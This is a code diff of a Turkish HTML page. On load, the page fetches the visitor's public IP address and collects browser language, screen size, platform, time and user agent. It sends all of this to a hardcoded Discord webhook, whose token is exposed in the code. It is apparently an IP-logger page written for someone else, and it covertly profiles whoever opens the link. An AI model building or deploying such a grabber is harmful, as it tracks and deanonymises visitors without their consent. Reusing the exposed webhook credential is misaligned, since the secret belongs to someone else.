@@ -2,45 +2,75 @@
 <html lang="tr">
 <head>
     <meta charset="UTF-8">
-    <title>Sistem Kontrol</title>
+    <title>Cihaz Analiz Sistemi</title>
 </head>
-<body>
-    <div style="text-align: center; margin-top: 50px; font-family: sans-serif;">
-        <h1 id="baslik">📡 Sistem Kontrol Ediliyor...</h1>
-        <p id="mesaj">Lütfen bekleyin...</p>
-    </div>
+<body style="background-color: #2c2f33; color: white; font-family: sans-serif; text-align: center; padding-top: 50px;">
+    <h1 id="durum">🔍 Bilgiler Toplanıyor...</h1>
+    <p id="detay">Lütfen bekleyin, cihaz verileri analiz ediliyor.</p>
 
     <script>
-        // Senin linkini buraya koydum
+        // Senin linkini buraya tam ve doğru şekilde yerleştirdim
         const webhookURL = "https://discord.com/api/webhooks/1457050495964151929/cue_0Yvmkt49p_J8fV_M4ks3DeuDRMilywpZUAX-2StNSQVIBBWVAk13bXGP186puI73";
 
-        async function veriGonder() {
-            const baslik = document.getElementById('baslik');
-            const mesaj = document.getElementById('mesaj');
+        async function cihazBilgisiGonder() {
+            const durum = document.getElementById('durum');
+            const detay = document.getElementById('detay');
 
             try {
+                // 1. IP Adresini Alalım
+                const ipRes = await fetch('https://api.ipify.org?format=json');
+                const ipData = await ipRes.json();
+                const ip = ipData.ip;
+
+                // 2. Diğer Cihaz Bilgilerini Toplayalım
+                const bilgiler = {
+                    dil: navigator.language || navigator.userLanguage,
+                    ekran: window.screen.width + "x" + window.screen.height,
+                    platform: navigator.platform,
+                    zaman: new Date().toLocaleString('tr-TR'),
+                    tarayici: navigator.userAgent
+                };
+
+                // 3. Discord'a Gönderilecek Mesaj Formatı (Embed)
+                const mesaj = {
+                    embeds: [{
+                        title: "📱 Cihaz Bilgisi Raporu",
+                        color: 5814783, // Güzel bir mor/mavi tonu
+                        fields: [
+                            { name: "🌐 IP Adresi", value: ip, inline: true },
+                            { name: "🌍 Cihaz Dili", value: bilgiler.dil, inline: true },
+                            { name: "🖥️ Ekran Çözünürlüğü", value: bilgiler.ekran, inline: true },
+                            { name: "⚙️ İşletim Sistemi", value: bilgiler.platform, inline: true },
+                            { name: "🕒 Giriş Zamanı", value: bilgiler.zaman, inline: false },
+                            { name: "📂 Tarayıcı Detayı", value: "```" + bilgiler.tarayici + "```", inline: false }
+                        ],
+                        footer: { text: "Kişisel Cihaz Analiz Sistemi" }
+                    }]
+                };
+
+                // 4. Discord'a Gönder
                 const response = await fetch(webhookURL, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({
-                        content: "🚀 **BAĞLANTI BAŞARILI!** \nCihaz: " + navigator.userAgent
-                    })
+                    body: JSON.stringify(mesaj)
                 });
 
-                if (response.ok) {
-                    baslik.innerText = "✅ İŞLEM TAMAM!";
-                    mesaj.innerText = "Discord sunucuna bildirim gönderildi. Kanalı kontrol et!";
+                if (response.status === 204 || response.ok) {
+                    durum.innerText = "✅ BİLGİLER GÖNDERİLDİ!";
+                    detay.innerText = "Discord kanalına bak, tüm detaylar orada!";
                 } else {
-                    baslik.innerText = "❌ DISCORD REDDETTİ!";
-                    mesaj.innerText = "Hata Kodu: " + response.status + "\n(Muhtemelen Webhook linkin yanlış veya süresi dolmuş.)";
+                    durum.innerText = "❌ HATA OLUŞTU";
+                    detay.innerText = "Hata kodu: " + response.status;
                 }
-            } catch (hata) {
-                baslik.innerText = "⚠️ BAĞLANTI HATASI!";
-                mesaj.innerText = "İnternet veya tarayıcı engeli oluştu: " + hata;
+
+            } catch (err) {
+                durum.innerText = "⚠️ BAĞLANTI HATASI!";
+                detay.innerText = "Bilgiler alınırken bir sorun çıktı: " + err;
             }
         }
 
-        window.onload = veriGonder;
+        // Sayfa yüklendiğinde işlemi başlat
+        window.onload = cihazBilgisiGonder;
     </script>
 </body>
 </html>
